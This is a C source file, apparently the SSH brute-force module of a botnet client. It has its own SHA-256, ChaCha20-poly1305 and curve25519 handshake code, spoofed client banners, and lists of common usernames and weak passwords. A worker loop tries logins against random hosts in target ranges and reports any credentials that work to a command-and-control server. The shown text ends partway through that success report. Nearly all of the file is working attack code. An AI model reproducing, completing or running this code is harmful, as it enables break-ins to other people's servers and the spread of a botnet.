#define _GNU_SOURCE

#include <stdio.h>
#ifdef DEBUG
#endif
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <poll.h>
#include <time.h>

#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/x25519.h"
#include "headers/rand.h"
#include "headers/util.h"
#include "headers/crypto_poly1305.h"
#include "headers/cnc.h"
#include "headers/protocol.h"

extern int fd_serv;

static void send_response(int type, uint8_t *data, int len)
{
    if (!data || len <= 0)
        return;
    if (len > CNC_REPORT_MAX)
        len = CNC_REPORT_MAX;
    cnc_send_report(fd_serv, (uint8_t)type, data, (uint8_t)len);
#ifdef DEBUG
    printf("[ssh] response: %.*s\n", len, (char *)data);
#endif
}

#define MSG_RESP_TEXT 1

/* SSH-2 brute-force flood */



/* â”€â”€ SHA-256 (incremental) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

#define ROR32(x,n) (((x)>>(n))|((x)<<(32-(n))))
#define CH(e,f,g)  (((e)&(f))^(~(e)&(g)))
#define MAJ(a,b,c) (((a)&(b))^((a)&(c))^((b)&(c)))
#define S0(a) (ROR32(a,2)^ROR32(a,13)^ROR32(a,22))
#define S1(e) (ROR32(e,6)^ROR32(e,11)^ROR32(e,25))
#define G0(x) (ROR32(x,7)^ROR32(x,18)^((x)>>3))
#define G1(x) (ROR32(x,17)^ROR32(x,19)^((x)>>10))

static const uint32_t K256[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

typedef struct {
    uint32_t h[8];
    uint8_t  buf[64];
    uint64_t bits;
    uint32_t len;
} sha256_ctx;

static void sha256_compress(uint32_t h[8], const uint8_t *blk)
{
    uint32_t w[64], a,b,c,d,e,f,g,hh,t1,t2;
    int i;
    for (i = 0; i < 16; i++)
        w[i] = (uint32_t)blk[i*4]<<24|(uint32_t)blk[i*4+1]<<16|
               (uint32_t)blk[i*4+2]<<8|(uint32_t)blk[i*4+3];
    for (; i < 64; i++)
        w[i] = G1(w[i-2])+w[i-7]+G0(w[i-15])+w[i-16];
    a=h[0];b=h[1];c=h[2];d=h[3];e=h[4];f=h[5];g=h[6];hh=h[7];
    for (i = 0; i < 64; i++) {
        t1 = hh+S1(e)+CH(e,f,g)+K256[i]+w[i];
        t2 = S0(a)+MAJ(a,b,c);
        hh=g; g=f; f=e; e=d+t1; d=c; c=b; b=a; a=t1+t2;
    }
    h[0]+=a;h[1]+=b;h[2]+=c;h[3]+=d;h[4]+=e;h[5]+=f;h[6]+=g;h[7]+=hh;
}

static void sha256_init(sha256_ctx *c)
{
    c->h[0]=0x6a09e667;c->h[1]=0xbb67ae85;c->h[2]=0x3c6ef372;c->h[3]=0xa54ff53a;
    c->h[4]=0x510e527f;c->h[5]=0x9b05688c;c->h[6]=0x1f83d9ab;c->h[7]=0x5be0cd19;
    c->bits = 0; c->len = 0;
}

static void sha256_update(sha256_ctx *c, const uint8_t *d, uint32_t n)
{
    c->bits += (uint64_t)n * 8;
    while (n) {
        uint32_t cp = 64 - c->len;
        if (cp > n) cp = n;
        memcpy(c->buf + c->len, d, cp);
        c->len += cp; d += cp; n -= cp;
        if (c->len == 64) { sha256_compress(c->h, c->buf); c->len = 0; }
    }
}

static void sha256_final(sha256_ctx *c, uint8_t *out)
{
    uint64_t bits = c->bits;
    uint8_t pad[64] = {0x80};
    uint32_t plen = (c->len < 56) ? (56 - c->len) : (120 - c->len);
    sha256_update(c, pad, plen);
    for (int i = 7; i >= 0; i--) { uint8_t b = (bits>>(i*8))&0xff; sha256_update(c,&b,1); }
    for (int i = 0; i < 8; i++) {
        out[i*4]   = c->h[i]>>24; out[i*4+1] = c->h[i]>>16;
        out[i*4+2] = c->h[i]>>8;  out[i*4+3] = c->h[i];
    }
}

static void sha256(const uint8_t *d, uint32_t n, uint8_t *out)
{
    sha256_ctx c; sha256_init(&c); sha256_update(&c,d,n); sha256_final(&c,out);
}

/* â”€â”€ ChaCha20 (original 8-byte nonce, Bernstein) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

#define ROTL32(v,n) (((v)<<(n))|((v)>>(32-(n))))
#define QR(a,b,c,d) \
    a+=b; d^=a; d=ROTL32(d,16); \
    c+=d; b^=c; b=ROTL32(b,12); \
    a+=b; d^=a; d=ROTL32(d, 8); \
    c+=d; b^=c; b=ROTL32(b, 7)

static void chacha20_block(const uint32_t st[16], uint8_t out[64])
{
    uint32_t x[16]; int i;
    memcpy(x, st, 64);
    for (i = 0; i < 10; i++) {
        QR(x[0],x[4],x[8], x[12]); QR(x[1],x[5],x[9], x[13]);
        QR(x[2],x[6],x[10],x[14]); QR(x[3],x[7],x[11],x[15]);
        QR(x[0],x[5],x[10],x[15]); QR(x[1],x[6],x[11],x[12]);
        QR(x[2],x[7],x[8], x[13]); QR(x[3],x[4],x[9], x[14]);
    }
    for (i = 0; i < 16; i++) {
        uint32_t v = x[i] + st[i];
        out[i*4]   = v;       out[i*4+1] = v>>8;
        out[i*4+2] = v>>16;   out[i*4+3] = v>>24;
    }
}

/* key[32], nonce[8] (seq as 64-bit LE), ctr_lo/ctr_hi = counter */
static void chacha20_init(uint32_t st[16],
    const uint8_t key[32], uint64_t seqno, uint64_t ctr)
{
    st[0]=0x61707865; st[1]=0x3320646e; st[2]=0x79622d32; st[3]=0x6b206574;
    int i;
    for (i=0;i<8;i++) st[4+i]=((uint32_t)key[i*4])|(key[i*4+1]<<8)|
                               (key[i*4+2]<<16)|(key[i*4+3]<<24);
    st[12] = (uint32_t)(ctr & 0xFFFFFFFF);
    st[13] = (uint32_t)(ctr >> 32);
    st[14] = (uint32_t)(seqno & 0xFFFFFFFF);
    st[15] = (uint32_t)(seqno >> 32);
}

static void chacha20_xor(const uint8_t key[32], uint64_t seqno, uint64_t ctr,
                         const uint8_t *in, uint8_t *out, int len)
{
    uint32_t st[16]; uint8_t block[64];
    chacha20_init(st, key, seqno, ctr);
    while (len > 0) {
        chacha20_block(st, block);
        int n = len < 64 ? len : 64;
        for (int i=0;i<n;i++) out[i]=in[i]^block[i];
        in+=n; out+=n; len-=n; st[12]++;
    }
}

static void chacha20_gen(const uint8_t key[32], uint64_t seqno, uint64_t ctr,
                         uint8_t *out, int len)
{
    static const uint8_t zeros[256] = {0};
    /* XOR zeros = keystream */
    uint32_t st[16]; uint8_t block[64];
    chacha20_init(st, key, seqno, ctr);
    while (len > 0) {
        chacha20_block(st, block);
        int n = len < 64 ? len : 64;
        memcpy(out, block, n);
        out+=n; len-=n; st[12]++;
    }
    (void)zeros;
}

/* ─── SSH packet helpers ─── */

/* Append big-endian uint32 */
static void put_u32(uint8_t **p, uint32_t v)
{
    (*p)[0]=v>>24; (*p)[1]=v>>16; (*p)[2]=v>>8; (*p)[3]=v;
    *p += 4;
}

/* Append SSH string (uint32 len + bytes) */
static void put_str(uint8_t **p, const char *s, int len)
{
    if (len < 0) len = (int)strlen(s);
    put_u32(p, (uint32_t)len);
    memcpy(*p, s, len); *p += len;
}

/* Append SSH mpint (big-endian; prepend 0x00 if high bit set) */
static void put_mpint(uint8_t **p, const uint8_t *v, int len)
{
    /* strip leading zeros */
    while (len > 1 && v[0] == 0) { v++; len--; }
    if (v[0] & 0x80) {
        put_u32(p, (uint32_t)len + 1);
        *(*p)++ = 0x00;
    } else {
        put_u32(p, (uint32_t)len);
    }
    memcpy(*p, v, len); *p += len;
}

static void put_bool(uint8_t **p, int v) { *(*p)++ = v ? 1 : 0; }
static void put_byte(uint8_t **p, uint8_t v) { *(*p)++ = v; }

static int ssh_buf_has_substr(const uint8_t *buf, int len, const char *needle)
{
    int nlen = (int)strlen(needle);
    int i;

    if (nlen <= 0 || len < nlen)
        return 0;
    for (i = 0; i <= len - nlen; i++) {
        if (memcmp(buf + i, needle, (size_t)nlen) == 0)
            return 1;
    }
    return 0;
}

/* Wrap payload into an SSH plaintext packet (before encryption).
 * Returns total packet length. buf must have room for 5 + payload_len + 15 bytes. */
static int ssh_packet(uint8_t *buf, const uint8_t *payload, int plen)
{
    /* padding to multiple of 8 (stream cipher block size) */
    int total = 1 + plen;          /* padding_length + payload */
    int pad   = 8 - (total % 8);
    if (pad < 4) pad += 8;
    uint32_t pkt_len = 1 + plen + pad;
    buf[0] = pkt_len >> 24; buf[1] = pkt_len >> 16;
    buf[2] = pkt_len >>  8; buf[3] = pkt_len;
    buf[4] = (uint8_t)pad;
    memcpy(buf + 5, payload, plen);
    memset(buf + 5 + plen, 0xAA, pad);  /* random padding */
    return 4 + (int)pkt_len;
}

/* â”€â”€ SSH chacha20-poly1305 send/recv â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

typedef struct {
    /* key split: main_key (bytes 0-31) encrypts payload;
       hdr_key (bytes 32-63) encrypts 4-byte length field */
    uint8_t main_key[32];
    uint8_t hdr_key[32];
    uint32_t seq;
} ssh_enc_t;

static int fd_write_all(int fd, const uint8_t *buf, int len)
{
    while (len > 0) {
        int n = (int)write(fd, buf, len);
        if (n <= 0) return -1;
        buf += n; len -= n;
    }
    return 0;
}

/* Send one encrypted SSH packet */
static int enc_send(int fd, ssh_enc_t *e, const uint8_t *payload, int plen)
{
    /* build plaintext packet */
    uint8_t pkt[4096]; int pklen;
    pklen = ssh_packet(pkt, payload, plen);

    /* Allocate output: 4 (enc len) + pklen-4 (enc payload) + 16 (mac) */
    uint8_t out[4096 + 20];
    uint64_t seqno = e->seq;

    /* Encrypt length field with hdr_key */
    chacha20_xor(e->hdr_key, seqno, 0, pkt, out, 4);

    /* Generate poly1305 key: ChaCha20(main_key, seqno, ctr=0)[0..31] */
    uint8_t poly_key[64];
    chacha20_gen(e->main_key, seqno, 0, poly_key, 64);

    /* Encrypt payload (everything after length field) with main_key, ctr=1 */
    chacha20_xor(e->main_key, seqno, 1, pkt + 4, out + 4, pklen - 4);

    /* MAC over (encrypted_length || encrypted_payload) */
    poly1305_mac(out + pklen, poly_key, out, pklen);

    e->seq++;
    return fd_write_all(fd, out, pklen + 16);
}

/* Read one encrypted packet; returns payload length or -1 */
static int enc_recv(int fd, ssh_enc_t *e, uint8_t *payload, int maxlen, int timeout_ms)
{
    struct pollfd pfd = {fd, POLLIN, 0};
    uint8_t enc_len[4];
    uint64_t seqno = e->seq;

    /* Read 4-byte encrypted length */
    if (poll(&pfd, 1, timeout_ms) <= 0) return -1;
    if (read(fd, enc_len, 4) != 4) return -1;

    uint8_t len_plain[4];
    chacha20_xor(e->hdr_key, seqno, 0, enc_len, len_plain, 4);
    uint32_t pkt_len = ((uint32_t)len_plain[0]<<24)|((uint32_t)len_plain[1]<<16)|
                       ((uint32_t)len_plain[2]<<8)|len_plain[3];

    if (pkt_len < 12 || pkt_len > 32768) return -1;

    uint8_t enc_rest[32768 + 16];
    uint32_t rest = pkt_len + 16; /* payload + padding + mac */
    uint32_t got = 0;
    while (got < rest) {
        pfd.revents = 0;
        if (poll(&pfd, 1, timeout_ms) <= 0) break;
        int n = (int)read(fd, enc_rest + got, rest - got);
        if (n <= 0) break;
        got += n;
    }
    if (got < rest) return -1;

    /* Verify MAC */
    uint8_t poly_key[64];
    chacha20_gen(e->main_key, seqno, 0, poly_key, 64);
    uint8_t all_enc[32768 + 4];
    memcpy(all_enc, enc_len, 4);
    memcpy(all_enc + 4, enc_rest, pkt_len);
    uint8_t tag[16];
    poly1305_mac(tag, poly_key, all_enc, 4 + pkt_len);
    if (memcmp(tag, enc_rest + pkt_len, 16) != 0) return -1;

    /* Decrypt payload */
    uint8_t plain[32768];
    chacha20_xor(e->main_key, seqno, 1, enc_rest, plain, pkt_len);

    uint8_t pad = plain[0];
    int pay_len = (int)pkt_len - 1 - (int)pad;
    if (pay_len <= 0 || pay_len > maxlen) return -1;
    memcpy(payload, plain + 1, pay_len);
    e->seq++;
    return pay_len;
}

/* â”€â”€ Read a full plaintext SSH packet â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

static int plain_read(int fd, uint8_t *payload, int maxlen, int timeout_ms)
{
    struct pollfd pfd = {fd, POLLIN, 0};
    uint8_t hdr[5];

    if (poll(&pfd, 1, timeout_ms) <= 0) return -1;
    if (read(fd, hdr, 5) != 5) return -1;
    uint32_t pkt_len = ((uint32_t)hdr[0]<<24)|(hdr[1]<<16)|(hdr[2]<<8)|hdr[3];
    uint8_t  pad     = hdr[4];
    if (pkt_len < 5 || pkt_len > 32768) return -1;

    uint8_t buf[32768]; uint32_t need = pkt_len - 1, got = 0;
    while (got < need) {
        pfd.revents = 0;
        if (poll(&pfd, 1, timeout_ms) <= 0) break;
        int n = (int)read(fd, buf + got, need - got);
        if (n <= 0) break;
        got += n;
    }
    if (got < need) return -1;

    int pay_len = (int)need - (int)pad;
    if (pay_len <= 0 || pay_len > maxlen) return -1;
    memcpy(payload, buf, pay_len);
    return pay_len;
}

/* â”€â”€ Plaintext send â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

static int plain_send(int fd, const uint8_t *payload, int plen)
{
    uint8_t pkt[4096];
    int n = ssh_packet(pkt, payload, plen);
    return fd_write_all(fd, pkt, n);
}

/* â”€â”€ Rotations â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

static const char *SSH_VERSIONS[] = {
    "SSH-2.0-OpenSSH_7.4",
    "SSH-2.0-OpenSSH_8.0",
    "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6",
    "SSH-2.0-OpenSSH_9.3p1",
    "SSH-2.0-libssh-0.9.6",
    "SSH-2.0-PuTTY_Release_0.78",
    "SSH-2.0-Dropbear_2022.83",
    "SSH-2.0-JSCH-0.1.55",
    "SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13",
};
#define N_VERSIONS 10

static const char *USERNAMES[] = {
    "root","admin","ubuntu","user","pi","oracle","postgres","git",
    "ec2-user","vagrant","centos","debian","test","deploy","ansible",
};
#define N_USERS 15

static const char *WORDLIST[] = {
    "root","admin","password","123456","1234","12345","12345678","test",
    "qwerty","abc123","letmein","monkey","master","dragon","iloveyou",
    "sunshine","shadow","princess","admin123","root123","toor","pass",
    "changeme","default","welcome","login","1q2w3e4r","1q2w3e4r5t",
    "raspberry","alpine","vagrant","cisco","redhat","nagios","hadoop",
    "docker","puppet","jenkins","P@ssw0rd","passw0rd","Pa$$word",
    "Summer2023!","Winter2024!","Spring2024!","Autumn2023!","Admin@123",
    "Server123","Linux123","Ubuntu2204","Debian11","Admin2024",
};
#define N_WORDS 50

static const char CHARSET[] =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$";
#define CHARSET_LEN 68

static void rand_password(char *buf, int len)
{
    int i;
    for (i = 0; i < len; i++)
        buf[i] = CHARSET[rand_next() % CHARSET_LEN];
    buf[len] = '\0';
}

/* â”€â”€ SSH key derivation (RFC 4253 Â§7.2) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

/*
 * derive_key: compute SSH session key material.
 * K     = shared X25519 secret (raw 32 bytes, reversed to big-endian)
 * H     = exchange hash (32 bytes SHA-256)
 * label = 'A'..'F'
 * sessid= session id = H (on first kex)
 * out   = key_len bytes of key material
 */
static void derive_key(const uint8_t *K, int klen,
                       const uint8_t *H,
                       const uint8_t *sessid,
                       char label, uint8_t *out, int out_len)
{
    /* K1 = SHA-256(mpint(K) || H || label || session_id) */
    sha256_ctx c;
    uint8_t tmp[32];

    sha256_init(&c);
    /* encode K as SSH mpint */
    uint8_t u32[4];
    uint32_t kl = (K[0] & 0x80) ? (uint32_t)klen + 1 : (uint32_t)klen;
    u32[0]=kl>>24;u32[1]=kl>>16;u32[2]=kl>>8;u32[3]=kl;
    sha256_update(&c, u32, 4);
    if (K[0] & 0x80) { uint8_t z=0; sha256_update(&c,&z,1); }
    sha256_update(&c, K, klen);
    sha256_update(&c, H, 32);
    sha256_update(&c, (uint8_t*)&label, 1);
    sha256_update(&c, sessid, 32);
    sha256_final(&c, tmp);

    int got = 0;
    while (got < out_len) {
        int cp = out_len - got;
        if (cp > 32) cp = 32;
        memcpy(out + got, tmp, cp);
        got += cp;
        if (got < out_len) {
            /* K2 = SHA-256(mpint(K) || H || K1) */
            sha256_init(&c);
            uint32_t kl2 = (K[0]&0x80)?(uint32_t)klen+1:(uint32_t)klen;
            u32[0]=kl2>>24;u32[1]=kl2>>16;u32[2]=kl2>>8;u32[3]=kl2;
            sha256_update(&c,u32,4);
            if(K[0]&0x80){uint8_t z=0;sha256_update(&c,&z,1);}
            sha256_update(&c,K,klen);
            sha256_update(&c,H,32);
            sha256_update(&c,out,got);
            sha256_final(&c,tmp);
        }
    }
}

/* â”€â”€ Single brute-force attempt â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

/*
 * Returns:
 *  1  = authenticated (password correct)
 *  0  = auth failed / connection closed
 * -1  = protocol error
 */
static int ssh_try_password(int fd,
                             const char *username, const char *password,
                             const char *client_ver, const char *server_ver,
                             uint32_t *seq_c2s, uint32_t *seq_s2c)
{
    (void)seq_c2s; (void)seq_s2c;
    uint8_t buf[8192], payload[4096];
    uint8_t *p;
    int n;

    /* â”€â”€ KEXINIT â”€â”€ */
    p = payload;
    put_byte(&p, 20); /* SSH_MSG_KEXINIT */
    uint32_t i;
    for (i=0;i<4;i++) { uint32_t r=rand_next(); put_u32(&p,r); } /* cookie */

    /* Save our kexinit payload for exchange hash */
    const char *kex_alg   = "curve25519-sha256,curve25519-sha256@libssh.org";
    const char *hk_alg    = "ecdsa-sha2-nistp256,ssh-rsa";
    const char *enc_alg   = "chacha20-poly1305@openssh.com";
    const char *mac_alg   = "hmac-sha2-256";
    const char *comp_alg  = "none";
    const char *lang      = "";

    put_str(&p, kex_alg,  -1);
    put_str(&p, hk_alg,   -1);
    put_str(&p, enc_alg,  -1); /* c2s */
    put_str(&p, enc_alg,  -1); /* s2c */
    put_str(&p, mac_alg,  -1); /* c2s (ignored with chacha20-poly1305) */
    put_str(&p, mac_alg,  -1); /* s2c */
    put_str(&p, comp_alg, -1); /* c2s */
    put_str(&p, comp_alg, -1); /* s2c */
    put_str(&p, lang,     -1);
    put_str(&p, lang,     -1);
    put_bool(&p, 0);
    put_u32(&p, 0);

    int our_kexinit_len = (int)(p - payload);
    uint8_t our_kexinit[512];
    memcpy(our_kexinit, payload, our_kexinit_len);

    if (plain_send(fd, payload, (int)(p - payload)) < 0) return -1;

    /* Read server's KEXINIT */
    n = plain_read(fd, buf, sizeof(buf), 5000);
    if (n < 1 || buf[0] != 20) return -1;
    uint8_t srv_kexinit[4096];
    int srv_kexinit_len = n;
    memcpy(srv_kexinit, buf, n);

    if (!ssh_buf_has_substr(srv_kexinit, srv_kexinit_len, "curve25519-sha256"))
        return -1;
    if (!ssh_buf_has_substr(srv_kexinit, srv_kexinit_len, "chacha20-poly1305@openssh.com"))
        return -1;

    /* ── ECDH Init (curve25519) ── */
    uint8_t cli_priv[32], cli_pub[32];
    x25519_gen_keypair(cli_pub, cli_priv);

    p = payload;
    put_byte(&p, 30); /* SSH_MSG_KEX_ECDH_INIT */
    put_str(&p, (char*)cli_pub, 32);

    if (plain_send(fd, payload, (int)(p - payload)) < 0) return -1;

    /* Read ECDH Reply */
    n = plain_read(fd, buf, sizeof(buf), 8000);
    if (n < 1 || buf[0] != 31) return -1;

    /* Parse KEX_ECDH_REPLY:
       string: server host key blob
       string: server ephemeral pubkey (32 bytes)
       string: signature */
    uint8_t *rp = buf + 1;
    uint8_t *buf_end = buf + n;
    if (rp + 4 > buf_end) return -1;
    uint32_t hk_len = ((uint32_t)rp[0]<<24)|(rp[1]<<16)|(rp[2]<<8)|rp[3]; rp+=4;
    if (rp + hk_len > buf_end) return -1;
    uint8_t *hk_blob = rp; rp += hk_len;
    if (rp + 4 > buf_end) return -1;
    uint32_t srv_pub_len = ((uint32_t)rp[0]<<24)|(rp[1]<<16)|(rp[2]<<8)|rp[3]; rp+=4;
    if (srv_pub_len != 32) return -1;
    if (rp + 32 > buf_end) return -1;
    uint8_t srv_pub[32]; memcpy(srv_pub, rp, 32); rp+=32;
    /* skip signature */

    /* â”€â”€ Compute shared secret â”€â”€ */
    uint8_t shared[32];
    x25519_scalarmult(shared, cli_priv, srv_pub);

    /* X25519 output is little-endian; SSH mpint expects big-endian â†’ reverse */
    uint8_t K[32];
    for (i=0;i<32;i++) K[i] = shared[31-i];

    /* â”€â”€ Exchange hash H = SHA-256(...) â”€â”€ */
    sha256_ctx hctx; sha256_init(&hctx);

    /* client version string */
    { uint8_t tmp[512]; uint8_t *tp=tmp; put_str(&tp,client_ver,-1); sha256_update(&hctx,tmp,(int)(tp-tmp)); }
    { uint8_t tmp[512]; uint8_t *tp=tmp; put_str(&tp,server_ver,-1); sha256_update(&hctx,tmp,(int)(tp-tmp)); }
    /* client kexinit (framed as SSH string) */
    { uint8_t tmp[8]; uint8_t *tp=tmp; put_u32(&tp,(uint32_t)our_kexinit_len); sha256_update(&hctx,tmp,4); sha256_update(&hctx,our_kexinit,our_kexinit_len); }
    /* server kexinit */
    { uint8_t tmp[8]; uint8_t *tp=tmp; put_u32(&tp,(uint32_t)srv_kexinit_len); sha256_update(&hctx,tmp,4); sha256_update(&hctx,srv_kexinit,srv_kexinit_len); }
    /* server host key blob */
    { uint8_t tmp[8]; uint8_t *tp=tmp; put_u32(&tp,hk_len); sha256_update(&hctx,tmp,4); sha256_update(&hctx,hk_blob,hk_len); }
    /* Q_C: client ephemeral pubkey */
    { uint8_t tmp[8]; uint8_t *tp=tmp; put_u32(&tp,32); sha256_update(&hctx,tmp,4); sha256_update(&hctx,cli_pub,32); }
    /* Q_S: server ephemeral pubkey */
    { uint8_t tmp[8]; uint8_t *tp=tmp; put_u32(&tp,32); sha256_update(&hctx,tmp,4); sha256_update(&hctx,srv_pub,32); }
    /* K as mpint */
    { uint8_t tmp[40]; uint8_t *tp=tmp; put_mpint(&tp,K,32); sha256_update(&hctx,tmp,(int)(tp-tmp)); }

    uint8_t H[32]; sha256_final(&hctx, H);

    /* â”€â”€ Derive session keys â”€â”€ */
    uint8_t key_c2s[64], key_s2c[64];
    derive_key(K, 32, H, H, 'C', key_c2s, 64);
    derive_key(K, 32, H, H, 'D', key_s2c, 64);

    /* Split chacha20-poly1305 keys (main=bytes 0-31, hdr=bytes 32-63) */
    ssh_enc_t enc_c2s; memset(&enc_c2s, 0, sizeof(enc_c2s));
    ssh_enc_t enc_s2c; memset(&enc_s2c, 0, sizeof(enc_s2c));
    memcpy(enc_c2s.main_key, key_c2s,    32);
    memcpy(enc_c2s.hdr_key,  key_c2s+32, 32);
    memcpy(enc_s2c.main_key, key_s2c,    32);
    memcpy(enc_s2c.hdr_key,  key_s2c+32, 32);

    /* â”€â”€ Send NEWKEYS â”€â”€ */
    payload[0] = 21;
    if (plain_send(fd, payload, 1) < 0) return -1;

    /* Read server NEWKEYS */
    n = plain_read(fd, buf, sizeof(buf), 5000);
    if (n < 1 || buf[0] != 21) return -1;

    /* â”€â”€ Send SERVICE_REQUEST "ssh-userauth" (encrypted) â”€â”€ */
    p = payload;
    put_byte(&p, 5);
    put_str(&p, "ssh-userauth", -1);
    if (enc_send(fd, &enc_c2s, payload, (int)(p-payload)) < 0) return -1;

    /* Read SERVICE_ACCEPT */
    n = enc_recv(fd, &enc_s2c, buf, sizeof(buf), 5000);
    if (n < 1 || buf[0] != 6) return -1;

    /* â”€â”€ Send USERAUTH_REQUEST with password â”€â”€ */
    p = payload;
    put_byte(&p, 50); /* SSH_MSG_USERAUTH_REQUEST */
    put_str(&p, username, -1);
    put_str(&p, "ssh-connection", -1);
    put_str(&p, "password", -1);
    put_bool(&p, 0); /* not changing password */
    put_str(&p, password, -1);
    if (enc_send(fd, &enc_c2s, payload, (int)(p-payload)) < 0) return -1;

    /* Read response */
    n = enc_recv(fd, &enc_s2c, buf, sizeof(buf), 6000);
    if (n < 1) return -1;

    if (buf[0] == 52) return 1;  /* SSH_MSG_USERAUTH_SUCCESS */
    if (buf[0] == 51) return 0;  /* SSH_MSG_USERAUTH_FAILURE */
    return 0;
}

/* â”€â”€ Worker â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

static void ssh_worker(uint8_t targs_len, struct attack_target *targs,
                       uint8_t opts_len, struct attack_option *opts,
                       int worker_id)
{
    uint16_t dport = (uint16_t)attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 22);
    int aggressive = attack_get_opt_int(opts_len, opts, ATK_OPT_AGGRESSIVE, 0);

    uint32_t attempt = 0;
    int word_idx = (worker_id * 7) % N_WORDS;  /* stagger wordlist per worker */

    while (g_atk_end_time == 0 || time(NULL) < g_atk_end_time)
    {
        int tidx   = rand_next() % targs_len;
        uint32_t dst = targs[tidx].addr;
        if (targs[tidx].netmask < 32)
            dst = htonl(ntohl(dst) + (rand_next() >> targs[tidx].netmask));

        /* Pick rotation values */
        const char *ver  = SSH_VERSIONS[rand_next() % N_VERSIONS];
        const char *user = USERNAMES[rand_next() % N_USERS];

        /* Password: alternate between wordlist and random (different lengths) */
        char pw_buf[32];
        const char *pass;
        if (attempt % 3 == 0 && word_idx < N_WORDS) {
            pass = WORDLIST[word_idx];
            word_idx = (word_idx + 1) % N_WORDS;
        } else {
            /* random password: length varies 6-20 */
            int plen = 6 + (int)(rand_next() % 15);
            rand_password(pw_buf, plen);
            pass = pw_buf;
        }
        attempt++;

        /* Connect */
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;

        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(dport);
        addr.sin_addr.s_addr = dst;

        /* In aggressive mode, use shorter timeouts */
        struct timeval tv = aggressive ? (struct timeval){1, 0} : (struct timeval){5, 0};
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(fd); continue;
        }

        /* Banner exchange */
        char our_banner[128];
        snprintf(our_banner, sizeof(our_banner), "%s\r\n", ver);
        write(fd, our_banner, (int)strlen(our_banner));

        char srv_banner[256] = {0};
        int blen = 0;
        struct pollfd pfd = {fd, POLLIN, 0};
        int banner_timeout = aggressive ? 1000 : 5000;
        while (blen < (int)sizeof(srv_banner) - 1) {
            if (poll(&pfd, 1, banner_timeout) <= 0) break;
            int n = (int)read(fd, srv_banner + blen, 1);
            if (n <= 0) break;
            blen++;
            if (blen >= 2 && srv_banner[blen-2]=='\r' && srv_banner[blen-1]=='\n') break;
        }
        /* Strip \r\n */
        while (blen > 0 && (srv_banner[blen-1]=='\n'||srv_banner[blen-1]=='\r'))
            srv_banner[--blen] = '\0';

        if (blen < 7 || memcmp(srv_banner, "SSH-2.0", 7) != 0) {
            close(fd); continue;
        }

        uint32_t seq_c = 0, seq_s = 0;
        if (ssh_try_password(fd, user, pass, ver, srv_banner, &seq_c, &seq_s) == 1) {
            /* auth success â€” send result text back to CNC */
            char msg[256];
